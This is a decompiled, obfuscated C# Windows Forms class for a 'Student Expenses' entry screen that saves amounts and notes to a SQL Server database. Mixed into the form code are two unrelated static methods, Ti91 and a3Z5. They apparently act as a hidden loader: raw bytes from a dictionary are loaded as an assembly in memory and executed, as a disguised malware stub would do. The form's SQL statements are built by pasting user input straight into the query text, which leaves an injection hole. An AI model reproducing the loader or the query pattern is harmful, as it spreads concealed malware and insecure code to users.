using System;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Kc71;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Pt8;
using Qm3;
using r8C;
using x5BP;
using z2C5;

namespace Ez5;

[DesignerGenerated]
public class Kb2 : Form
{
	private Label _Label3;

	private Label _Label4;

	private Label _Label5;

	private Label _Label2;

	private PictureBox _PictureBox5;

	private TextBox _TxtNote;

	private Label _Label8;

	private DateTimePicker _TxtDate;

	private SqlConnection Sqlcn;

	private SqlCommand Sqlcmd;

	private SqlDataAdapter da;

	private string _AddPass;

	private string _NotePass;

	internal IContainer F;

	internal Button x;

	internal Label w;

	internal TextBox t;

	internal PictureBox R;

	internal PictureBox d;

	internal Timer E;

	internal Label l;

	internal PictureBox A;

	internal PictureBox O;

	internal Label q;

	internal Button K;

	internal DataSet G;

	internal string b;

	public string StringPass
	{
		get
		{
			return b;
		}
		set
		{
			string text = (b = value);
		}
	}

	public string AddPass
	{
		get
		{
			return _AddPass;
		}
		set
		{
			_AddPass = value;
		}
	}

	public string NotePass
	{
		get
		{
			return _NotePass;
		}
		set
		{
			_NotePass = value;
		}
	}

	public Kb2()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Zk4e);
		SqlConnection val = new SqlConnection();
		val.set_ConnectionString("Data Source=DELL;Initial Catalog=logindata;Integrated Security=True");
		Sqlcn = val;
		Sqlcmd = new SqlCommand();
		Zi3();
	}

	protected override void Rp9(bool i6C)
	{
		try
		{
			if (i6C && F != null)
			{
				F.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(i6C);
		}
	}

	private void Zi3()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Expected O, but got Unknown
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f4: Expected O, but got Unknown
		//IL_017d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Expected O, but got Unknown
		//IL_0239: Unknown result type (might be due to invalid IL or missing references)
		//IL_0243: Expected O, but got Unknown
		//IL_02de: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e8: Expected O, but got Unknown
		//IL_0383: Unknown result type (might be due to invalid IL or missing references)
		//IL_038d: Expected O, but got Unknown
		//IL_0415: Unknown result type (might be due to invalid IL or missing references)
		//IL_041f: Expected O, but got Unknown
		//IL_04b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_04bb: Expected O, but got Unknown
		//IL_0549: Unknown result type (might be due to invalid IL or missing references)
		//IL_0553: Expected O, but got Unknown
		//IL_05fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0606: Expected O, but got Unknown
		//IL_06a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ab: Expected O, but got Unknown
		//IL_0737: Unknown result type (might be due to invalid IL or missing references)
		//IL_0741: Expected O, but got Unknown
		//IL_07d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_07dc: Expected O, but got Unknown
		//IL_086f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0879: Expected O, but got Unknown
		//IL_0915: Unknown result type (might be due to invalid IL or missing references)
		//IL_091f: Expected O, but got Unknown
		//IL_09c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_09d0: Expected O, but got Unknown
		//IL_0a7c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a86: Expected O, but got Unknown
		//IL_0b35: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b3f: Expected O, but got Unknown
		//IL_0bdc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be6: Expected O, but got Unknown
		//IL_0c75: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c7f: Expected O, but got Unknown
		//IL_0cba: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc4: Expected O, but got Unknown
		//IL_0d3a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d44: Expected O, but got Unknown
		//IL_0ea5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eaf: Expected O, but got Unknown
		IContainer container = (F = new Container());
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Kb2));
		Zp9(new Button());
		Eb2(new Label());
		r8J(new TextBox());
		Nj1(new PictureBox());
		So7(new PictureBox());
		Hg8(new Timer(F));
		Az7(new Label());
		i9W(new Label());
		j5K(new Label());
		j2N(new Label());
		Xt5(new PictureBox());
		p2F(new PictureBox());
		Ny6(new Label());
		w9G(new Label());
		Mx4(new PictureBox());
		Xf7(new Button());
		a6Y(new TextBox());
		Pq0(new Label());
		Tt1(new DateTimePicker());
		((ISupportInitialize)Hd7()).BeginInit();
		((ISupportInitialize)q3Z()).BeginInit();
		((ISupportInitialize)Na2()).BeginInit();
		((ISupportInitialize)r9K()).BeginInit();
		((ISupportInitialize)t4E()).BeginInit();
		((Control)this).SuspendLayout();
		((Control)Ye0()).set_Anchor((AnchorStyles)15);
		((ButtonBase)Ye0()).set_BackColor(Color.Lime);
		((Control)Ye0()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)Ye0()).set_FlatStyle((FlatStyle)0);
		((Control)Ye0()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Ye0()).set_ForeColor(Color.White);
		((Control)Ye0()).set_Location(new Point(558, 427));
		((Control)Ye0()).set_Name("cmdSubmit");
		((Control)Ye0()).set_Size(new Size(110, 26));
		((Control)Ye0()).set_TabIndex(4);
		((ButtonBase)Ye0()).set_Text(" &Submit");
		((ButtonBase)Ye0()).set_TextAlign((ContentAlignment)2);
		((ButtonBase)Ye0()).set_UseVisualStyleBackColor(false);
		((Control)Js1()).set_Anchor((AnchorStyles)15);
		((Control)Js1()).set_BackColor(Color.Transparent);
		((Control)Js1()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Js1()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)Js1()).set_Location(new Point(155, 25));
		((Control)Js1()).set_Name("Label1");
		((Control)Js1()).set_Size(new Size(63, 23));
		((Control)Js1()).set_TabIndex(5);
		Js1().set_Text("Date : ");
		((Control)n9B()).set_Anchor((AnchorStyles)15);
		((TextBoxBase)n9B()).set_BackColor(Color.Azure);
		((Control)n9B()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)n9B()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)n9B()).set_Location(new Point(305, 153));
		n9B().set_Multiline(true);
		((Control)n9B()).set_Name("TxtMoney");
		((Control)n9B()).set_Size(new Size(131, 26));
		((Control)n9B()).set_TabIndex(0);
		((Control)Hd7()).set_Anchor((AnchorStyles)15);
		((Control)Hd7()).set_BackColor(Color.Transparent);
		((Control)Hd7()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox1.BackgroundImage"));
		((Control)Hd7()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Hd7()).set_Location(new Point(0, 1));
		((Control)Hd7()).set_Name("PictureBox1");
		((Control)Hd7()).set_Size(new Size(100, 90));
		Hd7().set_TabIndex(5);
		Hd7().set_TabStop(false);
		((Control)q3Z()).set_Anchor((AnchorStyles)15);
		((Control)q3Z()).set_BackColor(Color.Transparent);
		((Control)q3Z()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox2.BackgroundImage"));
		((Control)q3Z()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)q3Z()).set_Location(new Point(502, 410));
		((Control)q3Z()).set_Name("PictureBox2");
		((Control)q3Z()).set_Size(new Size(63, 57));
		q3Z().set_TabIndex(6);
		q3Z().set_TabStop(false);
		((Control)g3D()).set_Anchor((AnchorStyles)15);
		((Control)g3D()).set_BackColor(Color.Gainsboro);
		((Control)g3D()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)g3D()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)g3D()).set_Location(new Point(223, 24));
		((Control)g3D()).set_Name("Label3");
		((Control)g3D()).set_Size(new Size(156, 23));
		((Control)g3D()).set_TabIndex(6);
		((Control)Gm4()).set_Anchor((AnchorStyles)15);
		((Control)Gm4()).set_BackColor(Color.Transparent);
		((Control)Gm4()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Gm4()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)Gm4()).set_Location(new Point(90, 291));
		((Control)Gm4()).set_Name("Label4");
		((Control)Gm4()).set_Size(new Size(105, 30));
		((Control)Gm4()).set_TabIndex(12);
		Gm4().set_Text("Add a Note");
		Gm4().set_TextAlign((ContentAlignment)32);
		((Control)Rg7()).set_Anchor((AnchorStyles)15);
		((Control)Rg7()).set_BackColor(Color.Transparent);
		((Control)Rg7()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Rg7()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)Rg7()).set_Location(new Point(477, 24));
		((Control)Rg7()).set_Name("Label5");
		((Control)Rg7()).set_Size(new Size(63, 23));
		((Control)Rg7()).set_TabIndex(7);
		Rg7().set_Text("Time : ");
		((Control)Yz7()).set_Anchor((AnchorStyles)15);
		((Control)Yz7()).set_BackColor(Color.Gainsboro);
		((Control)Yz7()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Yz7()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)Yz7()).set_Location(new Point(527, 24));
		((Control)Yz7()).set_Name("Label6");
		((Control)Yz7()).set_Size(new Size(137, 23));
		((Control)Yz7()).set_TabIndex(8);
		((Control)Na2()).set_Anchor((AnchorStyles)15);
		((Control)Na2()).set_BackColor(Color.Transparent);
		((Control)Na2()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox3.BackgroundImage"));
		((Control)Na2()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Na2()).set_Location(new Point(226, 137));
		((Control)Na2()).set_Name("PictureBox3");
		((Control)Na2()).set_Size(new Size(52, 42));
		Na2().set_TabIndex(11);
		Na2().set_TabStop(false);
		((Control)r9K()).set_Anchor((AnchorStyles)15);
		((Control)r9K()).set_BackColor(Color.Transparent);
		((Control)r9K()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox4.BackgroundImage"));
		((Control)r9K()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)r9K()).set_Location(new Point(226, 291));
		((Control)r9K()).set_Name("PictureBox4");
		((Control)r9K()).set_Size(new Size(52, 42));
		r9K().set_TabIndex(12);
		r9K().set_TabStop(false);
		((Control)n7D()).set_Anchor((AnchorStyles)15);
		((Control)n7D()).set_BackColor(Color.Transparent);
		((Control)n7D()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)n7D()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)n7D()).set_Location(new Point(210, 88));
		((Control)n7D()).set_Name("Label7");
		((Control)n7D()).set_Size(new Size(258, 30));
		((Control)n7D()).set_TabIndex(9);
		n7D().set_TextAlign((ContentAlignment)16);
		((Control)Le7()).set_Anchor((AnchorStyles)15);
		((Control)Le7()).set_BackColor(Color.Gainsboro);
		((Control)Le7()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Le7()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)Le7()).set_Location(new Point(466, 88));
		((Control)Le7()).set_Name("Label2");
		((Control)Le7()).set_Size(new Size(88, 30));
		((Control)Le7()).set_TabIndex(10);
		Le7().set_Text("(In Rupees)");
		Le7().set_TextAlign((ContentAlignment)16);
		((Control)t4E()).set_Anchor((AnchorStyles)15);
		((Control)t4E()).set_BackColor(Color.Transparent);
		((Control)t4E()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox5.BackgroundImage"));
		((Control)t4E()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)t4E()).set_Location(new Point(61, 419));
		((Control)t4E()).set_Name("PictureBox5");
		((Control)t4E()).set_Size(new Size(49, 48));
		t4E().set_TabIndex(16);
		t4E().set_TabStop(false);
		((Control)n1K()).set_Anchor((AnchorStyles)15);
		((ButtonBase)n1K()).set_BackColor(Color.Lime);
		((Control)n1K()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)n1K()).set_FlatStyle((FlatStyle)0);
		((Control)n1K()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)n1K()).set_ForeColor(Color.White);
		((Control)n1K()).set_Location(new Point(94, 431));
		((Control)n1K()).set_Name("Button2");
		((Control)n1K()).set_Size(new Size(110, 26));
		((Control)n1K()).set_TabIndex(3);
		((ButtonBase)n1K()).set_Text(" Go &Back");
		((ButtonBase)n1K()).set_TextAlign((ContentAlignment)2);
		((ButtonBase)n1K()).set_UseVisualStyleBackColor(false);
		((Control)x4A()).set_Anchor((AnchorStyles)15);
		((TextBoxBase)x4A()).set_BackColor(Color.Azure);
		((Control)x4A()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)x4A()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)x4A()).set_Location(new Point(305, 274));
		x4A().set_Multiline(true);
		((Control)x4A()).set_Name("TxtNote");
		((Control)x4A()).set_Size(new Size(281, 115));
		((Control)x4A()).set_TabIndex(2);
		((Control)f7L()).set_Anchor((AnchorStyles)15);
		((Control)f7L()).set_BackColor(Color.Transparent);
		((Control)f7L()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)f7L()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)f7L()).set_Location(new Point(55, 204));
		((Control)f7L()).set_Name("Label8");
		((Control)f7L()).set_Size(new Size(244, 30));
		((Control)f7L()).set_TabIndex(11);
		f7L().set_Text("Select Your Date");
		f7L().set_TextAlign((ContentAlignment)32);
		Sr2().set_CalendarFont(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Sr2().set_CalendarForeColor(Color.FromArgb(0, 64, 0));
		Sr2().set_CalendarTitleForeColor(Color.FromArgb(0, 64, 0));
		((Control)Sr2()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Sr2()).set_Location(new Point(305, 208));
		((Control)Sr2()).set_Name("TxtDate");
		((Control)Sr2()).set_Size(new Size(249, 26));
		((Control)Sr2()).set_TabIndex(17);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(705, 476));
		((Control)this).get_Controls().Add((Control)(object)Sr2());
		((Control)this).get_Controls().Add((Control)(object)f7L());
		((Control)this).get_Controls().Add((Control)(object)x4A());
		((Control)this).get_Controls().Add((Control)(object)t4E());
		((Control)this).get_Controls().Add((Control)(object)n1K());
		((Control)this).get_Controls().Add((Control)(object)Le7());
		((Control)this).get_Controls().Add((Control)(object)n7D());
		((Control)this).get_Controls().Add((Control)(object)r9K());
		((Control)this).get_Controls().Add((Control)(object)Na2());
		((Control)this).get_Controls().Add((Control)(object)Yz7());
		((Control)this).get_Controls().Add((Control)(object)Rg7());
		((Control)this).get_Controls().Add((Control)(object)Gm4());
		((Control)this).get_Controls().Add((Control)(object)g3D());
		((Control)this).get_Controls().Add((Control)(object)q3Z());
		((Control)this).get_Controls().Add((Control)(object)Hd7());
		((Control)this).get_Controls().Add((Control)(object)n9B());
		((Control)this).get_Controls().Add((Control)(object)Js1());
		((Control)this).get_Controls().Add((Control)(object)Ye0());
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form6");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Student Expenses");
		((ISupportInitialize)Hd7()).EndInit();
		((ISupportInitialize)q3Z()).EndInit();
		((ISupportInitialize)Na2()).EndInit();
		((ISupportInitialize)r9K()).EndInit();
		((ISupportInitialize)t4E()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Button Ye0()
	{
		return x;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Zp9(Button x6G)
	{
		EventHandler eventHandler = Mt32;
		Button val = x;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (x = x6G);
		val = x;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Js1()
	{
		return w;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Eb2(Label e8X)
	{
		EventHandler eventHandler = s1TF;
		Label val = w;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Label val2 = (w = e8X);
		val = w;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox n9B()
	{
		return t;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r8J(TextBox Sr7)
	{
		EventHandler eventHandler = Sw14;
		TextBox val = t;
		if (val != null)
		{
			((Control)val).remove_TextChanged(eventHandler);
		}
		TextBox val2 = (t = Sr7);
		val = t;
		if (val != null)
		{
			((Control)val).add_TextChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual PictureBox Hd7()
	{
		return R;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Nj1(PictureBox Nd7)
	{
		PictureBox val = (R = Nd7);
	}

	[SpecialName]
	internal virtual PictureBox q3Z()
	{
		return d;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void So7(PictureBox p3G)
	{
		EventHandler eventHandler = Lb2e;
		PictureBox val = d;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		PictureBox val2 = (d = p3G);
		val = d;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer k2D()
	{
		return E;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Hg8(Timer c8D)
	{
		EventHandler eventHandler = n7Q6;
		Timer e = E;
		if (e != null)
		{
			e.remove_Tick(eventHandler);
		}
		Timer val = (E = c8D);
		e = E;
		if (e != null)
		{
			e.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label g3D()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Az7(Label t4X)
	{
		EventHandler eventHandler = As5f;
		Label label = _Label3;
		if (label != null)
		{
			((Control)label).remove_Click(eventHandler);
		}
		_Label3 = t4X;
		label = _Label3;
		if (label != null)
		{
			((Control)label).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Gm4()
	{
		return _Label4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void i9W(Label m4X)
	{
		_Label4 = m4X;
	}

	[SpecialName]
	internal virtual Label Rg7()
	{
		return _Label5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j5K(Label Wt6)
	{
		EventHandler eventHandler = r8E4;
		Label label = _Label5;
		if (label != null)
		{
			((Control)label).remove_Click(eventHandler);
		}
		_Label5 = Wt6;
		label = _Label5;
		if (label != null)
		{
			((Control)label).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Yz7()
	{
		return l;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j2N(Label e1B)
	{
		EventHandler eventHandler = Jk20;
		Label val = l;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Label val2 = (l = e1B);
		val = l;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual PictureBox Na2()
	{
		return A;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xt5(PictureBox r3P)
	{
		EventHandler eventHandler = e4P9;
		PictureBox a = A;
		if (a != null)
		{
			((Control)a).remove_Click(eventHandler);
		}
		PictureBox val = (A = r3P);
		a = A;
		if (a != null)
		{
			((Control)a).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual PictureBox r9K()
	{
		return O;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p2F(PictureBox Xx3)
	{
		PictureBox val = (O = Xx3);
	}

	[SpecialName]
	internal virtual Label n7D()
	{
		return q;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ny6(Label Ta2)
	{
		Label val = (q = Ta2);
	}

	[SpecialName]
	internal virtual Label Le7()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void w9G(Label p8Z)
	{
		_Label2 = p8Z;
	}

	[SpecialName]
	internal virtual PictureBox t4E()
	{
		return _PictureBox5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Mx4(PictureBox g4K)
	{
		_PictureBox5 = g4K;
	}

	[SpecialName]
	internal virtual Button n1K()
	{
		return K;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xf7(Button r5K)
	{
		EventHandler eventHandler = i6PW;
		Button k = K;
		if (k != null)
		{
			((Control)k).remove_Click(eventHandler);
		}
		Button val = (K = r5K);
		k = K;
		if (k != null)
		{
			((Control)k).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox x4A()
	{
		return _TxtNote;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a6Y(TextBox n3H)
	{
		_TxtNote = n3H;
	}

	[SpecialName]
	internal virtual Label f7L()
	{
		return _Label8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pq0(Label Si4)
	{
		_Label8 = Si4;
	}

	[SpecialName]
	internal virtual DateTimePicker Sr2()
	{
		return _TxtDate;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Tt1(DateTimePicker Ly7)
	{
		_TxtDate = Ly7;
	}

	public bool f4RN()
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Sqlcn.Open();
			Sqlcn.Close();
			return true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public bool q3L7()
	{
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Expected O, but got Unknown
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		if (Sqlcn.get_State() != ConnectionState.Open)
		{
			Sqlcn.Open();
		}
		if (G != null)
		{
			G.Clear();
		}
		string identity = Gf87.Identity;
		DateTime dateTime = Conversions.ToDate(Sr2().get_Text());
		try
		{
			SqlCommand val = new SqlCommand("SELECT Count(Date) As Ucount FROM [" + identity + "] WHERE Date='" + Conversions.ToString(dateTime) + "' ", Sqlcn);
			da = new SqlDataAdapter(val);
			DataSet dataSet = (G = new DataSet());
			((DbDataAdapter)(object)da).Fill(G);
			Sqlcn.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		if (Operators.ConditionalCompareObjectEqual(G.Tables[0].Rows[0]["Ucount"], (object)1, false))
		{
			return true;
		}
		return false;
	}

	internal static string[] Ti91()
	{
		b8R.Pt8();
		Assembly value = Assembly.LoadFrom(Environment.GetCommandLineArgs()[0]);
		Ya7.mDic.Add("bee", value);
		return Xt6k.i7M3();
	}

	private void Zk4e(object sender, EventArgs e)
	{
		k2D().set_Enabled(true);
		n7D().set_Text(StringPass);
	}

	private void n7Q6(object sender, EventArgs e)
	{
		g3D().set_Text(DateTime.Now.ToString("   dd-MM-yyyy"));
		Yz7().set_Text(DateTime.Now.ToString("   hh:mm:ss"));
	}

	private void As5f(object sender, EventArgs e)
	{
	}

	private void Lb2e(object sender, EventArgs e)
	{
	}

	private void e4P9(object sender, EventArgs e)
	{
	}

	private void Sw14(object sender, EventArgs e)
	{
	}

	private void r8E4(object sender, EventArgs e)
	{
	}

	private void Jk20(object sender, EventArgs e)
	{
	}

	private void i6PW(object sender, EventArgs e)
	{
		((Control)Db5.Forms.Wq3()).Show();
		((Form)this).Close();
	}

	private void Mt32(object sender, EventArgs e)
	{
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01f8: Unknown result type (might be due to invalid IL or missing references)
		string text = n9B().get_Text();
		DateTime dateTime = Conversions.ToDate(Sr2().get_Text());
		string text2 = x4A().get_Text();
		string identity = Gf87.Identity;
		string addPass = AddPass;
		string notePass = NotePass;
		if (!f4RN())
		{
			return;
		}
		if (q3L7())
		{
			try
			{
				if (Sqlcn.get_State() != ConnectionState.Open)
				{
					Sqlcn.Open();
				}
				string text3 = "UPDATE [" + identity + "] SET [" + addPass + "] = '" + text + "' ,[" + notePass + "] = '" + text2 + "' WHERE [Date] = '" + Conversions.ToString(dateTime) + "' ";
				Sqlcmd = new SqlCommand(text3, Sqlcn);
				Sqlcmd.ExecuteNonQuery();
				Sqlcn.Close();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
			}
		}
		if (!q3L7())
		{
			try
			{
				if (Sqlcn.get_State() != ConnectionState.Open)
				{
					Sqlcn.Open();
				}
				string text4 = "INSERT INTO [" + identity + "]( [Date], [" + addPass + "], [" + notePass + "])  VALUES('" + Conversions.ToString(dateTime) + "','" + text + "','" + text2 + "')";
				Sqlcmd = new SqlCommand(text4, Sqlcn);
				Sqlcmd.ExecuteNonQuery();
				Sqlcn.Close();
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				Interaction.MsgBox((object)ex4.Message, (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
			}
		}
		((Control)Db5.Forms.Zj7()).Show();
		((Form)this).Close();
	}

	internal static void a3Z5()
	{
		Assembly assembly = null;
		byte[] rawAssembly = (byte[])Ya7.mDic[Ya7.mArray];
		assembly = Assembly.Load(rawAssembly);
		Ya7.mDic.Add("Deep", assembly);
		assembly = null;
		if (b8R.t9E())
		{
			Em23.Ng3d();
		}
	}

	private void s1TF(object sender, EventArgs e)
	{
	}
}
